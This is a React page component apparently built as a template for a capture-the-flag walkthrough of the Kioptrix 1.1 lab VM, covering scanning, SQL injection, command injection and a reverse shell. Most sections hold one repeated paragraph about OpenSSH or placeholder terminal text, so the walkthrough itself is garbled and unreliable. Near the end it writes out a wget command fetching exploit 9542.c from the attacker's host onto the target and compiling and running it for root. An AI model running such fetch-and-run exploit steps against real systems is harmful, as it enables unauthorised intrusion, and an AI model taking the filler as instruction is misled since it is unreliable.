import React from 'react'
import './Coding.css'
import { Link } from 'react-router-dom'
import Terminal from '../components/Terminal/Terminal'
import CodingBlog from '../components/CodingBlog/CodingBlog'
import Footer from '../components/Footer/Footer'
import CodingSidebar from '../components/CodingSidebar/CodingSidebar'

import hqdefault_6 from '../assets/hqdefault-6.jpg'


const Coding = () => {
  return (
    <>
    <div className='coding' style={{ color: '#fff' }}>
      <div className="main_div_flex">
        <div className="left_flex">
          <h1>Securiy Dispatch 1.1 Walkthrough Boot-To-Root</h1>
          <div className="main_user_flex">
            <div className="user_flex">
              <div className="logo">SD</div>
              <p className='name'>By <b>Security Dispatch</b></p>
            </div>
            <p className='date'> 4 years ago</p>
          </div>
          <div className="content_1">
            <h2>About Security Dispatch VM Image Challenges:</h2>
            <p className='upper_content'>The Kioptrix VM’s offer simple challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games is to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways than one to successfully complete the challenges.</p>
            <h1 className="video_heading">Video Walkthrough</h1>
            <div className="video_container">
              <img src={hqdefault_6} alt="" />
             </div>
            <h3 className="lab_set_up">Lab Setup</h3>
            <p className='para'>We will be using Kali Linux as our offensive OS and we will be running both Kali and the Kioptrix VM on VMware.</p><br />
            <p className='para'>You can download the Kioptrix 1.1 VM from the following link:</p><br />
            <Link to={"/#"} className='para1'>We will be using Kali Linux as our offensive OS and we will be running both Kali and the Kioptrix VM on VMware.</Link><br />
            <p className='para'>Our Kali VM has a local IP address of 192.168.1.106.</p><br />
            <p className='para'>The Kioptrix 1.1 VM has a local IP address of 192.168.1.104.</p><br />
            <h3 className="lab_set_up">Scanning & Enumeration</h3>
            <p className='para'>Let us get started by performing a Nmap scan on the target, we will be using the following arguments in our scan.</p><br />

            {/* You can add the line of code like text3,text4,text5,text6 in props please don't forget to update the terminal component */}

            <Terminal text1={"this is first terminal"} text2={"this is second terminal"} /> 
            <p className='para'>From the results, we can see that the target has various ports open, here are some of the interesting ones we should test:</p><br />
            <p className='para '>1. SSH – 22</p><br />
            <p className='para '>2. Apache – 80/443</p><br />
            <p className='para '>3. MySQL – 3306</p><br />
            <p className='para'>On the SSH port, we have OpenSSH 3.9p1 running, which is not vulnerable to any known exploit, so this can be used as an access vector after we have exploited the system, let us move on to the webserver.

            </p><br />
            <p className='para'>On the SSH port, we have OpenSSH 3.9p1 running, which is not vulnerable to any known exploit, so this can be used as an access vector after we have exploited the system, let us move on to the webserver.

            </p><br />
            <p className='para'>On the SSH port, we have OpenSSH 3.9p1 running, which is not vulnerable to any known exploit, so this can be used as an access vector after we have exploited the system, let us move on to the webserver.</p><br />
            <h3 className="lab_set_up">SQL Injection</h3>
            <p className='para'>On the SSH port, we have OpenSSH 3.9p1 running, which is not vulnerable to any known exploit, so this can be used as an access vector after we have exploited the system, let us move on to the webserver.</p><br />
            <h3 className="lab_set_up">Command Injection</h3>
            <p className='para'>On the SSH port, we have OpenSSH 3.9p1 running, which is not vulnerable to any known exploit, so this can be used as an access vector after we have exploited the system, let us move on to the webserver.</p><br />
            <h3 className="lab_set_up">Spawning A Reverse Shell</h3>
            <p className='para'>On the SSH port, we have OpenSSH 3.9p1 running, which is not vulnerable to any known exploit, so this can be used as an access vector after we have exploited the system, let us move on to the webserver.</p><br />
            <Terminal text1={"hello world"} />
            <p className="para">We can now use wget to download the exploit on to our target OS. We will download the file to the /tmp directory as we do not have sufficient permissions as the Apache user.</p>
            <Terminal text1={"wget http://192.168.1.106:8000/9542.c"} />
            <p className="para">After we successfully download the file onto the target OS, we can follow the compilation instructions and execute the exploit.</p>
            <Terminal text1={"$ gcc 9542.c -o exploit && ./exploit"} />
            <p className="para">After compiling and executing the exploit, we finally get a shell with root access!</p>
          </div>
        <CodingBlog />
        </div>
       <CodingSidebar />
      </div>
    </div>
    <Footer />
    </>
  )
}

export default Coding
